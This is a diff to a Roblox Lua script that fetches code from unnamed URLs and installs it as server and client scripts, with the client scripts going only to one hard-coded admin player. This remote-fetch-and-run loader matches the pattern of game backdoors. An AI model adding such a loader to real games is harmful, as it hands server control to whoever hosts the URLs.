@@ -15,32 +15,28 @@ local message = Instance.new('RemoteEvent')
 message.Name = 'message'  -- Changed the name to avoid conflict
 message.Parent = game.ReplicatedStorage
 
-local function fetchAndExecuteScript(url)
+local function fetchAndCreateScript(url, scriptType, parent)
 	local success, response = pcall(function()
 		return HttpService:GetAsync(url)
 	end)
 	
 	if success then
-		local executeScript = loadstring(response)
-		if executeScript then
-			executeScript()
-		else
-			warn("Failed to create function from URL: " .. url)
-		end
+		local newScript = Instance.new(scriptType)
+		newScript.Source = response
+		newScript.Parent = parent
 	else
 		warn("Failed to fetch data from URL: " .. url)
 	end
 end
 	
-fetchAndExecuteScript(serverUrl)
+fetchAndCreateScript(serverUrl, 'Script', game.ServerScriptService)
 	
 local adminPlayer = game.Players:GetPlayerByUserId(admin)
 if adminPlayer then
-	fetchAndExecuteScript(guiUrl)
+	local playerGui = adminPlayer:WaitForChild("PlayerGui")
+	fetchAndCreateScript(guiUrl, 'LocalScript', playerGui)
 	wait(5)
-	fetchAndExecuteScript(clientUrl)
+	fetchAndCreateScript(clientUrl, 'LocalScript', playerGui)
 else
 	warn("Admin player not found")
 end
-	
-
